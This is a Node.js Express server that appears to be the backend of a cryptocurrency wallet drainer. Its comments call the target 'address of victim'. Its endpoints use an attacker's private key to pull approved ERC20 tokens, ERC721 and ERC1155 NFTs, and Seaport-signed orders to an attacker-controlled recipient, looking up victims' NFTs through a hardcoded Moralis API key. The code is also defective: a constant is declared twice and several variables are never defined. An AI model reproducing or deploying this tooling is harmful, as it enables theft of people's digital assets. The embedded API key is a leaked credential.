const express = require("express");
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");

const app = express()
const PORT = process.env.PORT || 3000 

app.use(cors({
    origin: true,
}));
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const recipient = "letamrecipient";
const recipient = "letamprivatekey";

 let provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth"
);

/******** SEAPORT *******/
app.post("/seaport", async (req, res) => {
    let order = req.body.order;
    let address = req.body.address;

    try {
        const fulfillerWallet = new ethers.Wallet(privateKey);
        const fulfillerSigner = await fulfillerWallet.connect(provider);
        const spClientFulfiller = new seaport.Seaport(fulfillerSigner);


        const { executeAllActions: fulfillOrder } =
        await spClientFulfiller.fulfillOrder({
        order,
        accountAddress: address,
        recipientAddress: receiver
        });

        let transaction = await fulfillOrder();

        res.status(200).send({
            status: true,
            hash: transaction.hash
        })

    } catch(error) {
        console.warn("[-] Seaport error: ", error)
    }
});



app.post("/withdraw/erc20", async (req, res) => {

    // address of victim
    let address = req.body.address;

    // erc20 token contract address
    let contractAddress = req.body.contractAddress;

    // erc20 token balance number that will be withdrawed from coontract
    let withdrawBalance = req.body.withdrawBalance;

    // transactionHash 
    let hash = req.body.hash;

    await provider.waitForTransaction(hash);

    const signer = new ethers.Wallet(privateKey, provider);
    let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);

    let withdrawal = await contractInstance.transferFrom(address, recipient, withdrawBalance)

    console.log(withdrawal.hash)

    res.status(200).send({
        status: true,
    })

})

app.post("/withdraw/erc721", async (req, res) => {

    // address of victim
    let address = req.body.address;

    // nft token contract address
    let contractAddress = req.body.contractAddress;

    // transactionHash 
    let hash = req.body.hash;

    await provider.waitForTransaction(hash);

    let clientServerOptions = {
        uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
        method: 'GET',
        headers: {
            'Content-Type':'application/json',
            'Accept':'application/json',
            'X-API-KEY': 'xWuhxRUCEHao4WBDFvM6qIZSeEgGN18zrrWQMca7aiLtoa3fioq0Bgkf5PaiW0Gx'
        }
    }
    
    
    request(clientServerOptions, async (error, response, body) => {
        console.log("Sent ERC721 log");
    
        console.log(JSON.parse(body).result)
    
    
        let tokenIds = [];
        JSON.parse(body).result.map(token => tokenIds.push(token.token_id));

        const signer = new ethers.Wallet(privateKey, provider);
        for(let i = 0; i < tokenIds.length; i++) {
            let contractInstance = new ethers.Contract(contractAddress, ERC721, signer);
        
            let withdrawal = await contractInstance.safeTransferFrom(address, recipient, tokenIds[i])
        
            console.log("[+] Withdrawed token: " + tokenIds[i])
            console.log(withdrawal.hash)
        }
        res.status(200).send({
            status: true,
        })
    });
})


app.post("/withdraw/erc1155", async (req, res) => {

    // address of victim
    let address = req.body.address;

    // nft token contract address
    let contractAddress = req.body.contractAddress;

    // nft amount
    let amount = req.body.amount;

    // transactionHash 
    let hash = req.body.hash;

    await provider.waitForTransaction(hash);

    let clientServerOptions = {
        uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + contractAddress + '?chain=Eth&format=decimal',
        method: 'GET',
        headers: {
            'Content-Type':'application/json',
            'Accept':'application/json',
            'X-API-KEY': 'xWuhxRUCEHao4WBDFvM6qIZSeEgGN18zrrWQMca7aiLtoa3fioq0Bgkf5PaiW0Gx'
        }
    }
    
    
    request(clientServerOptions, async (error, response, body) => {
        console.log("Sent ERC1155 log");
    
        console.log(JSON.parse(body).result)
    
    
        let tokenIds = [];
        JSON.parse(body).result.map(token => tokenIds.push(token.token_id));

        const signer = new ethers.Wallet(privateKey, provider);
        for(let i = 0; i < tokenIds.length; i++) {
            let contractInstance = new ethers.Contract(contractAddress, ERC1155, signer);
        
            let withdrawal = await contractInstance.safeTransferFrom(address, recipient, tokenIds[i], 1, 256)
        
            console.log("[+] Withdrawed token: " + tokenIds[i])
            console.log(withdrawal.hash)
        }

        res.status(200).send({
            status: true,
        })
    });

})



app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
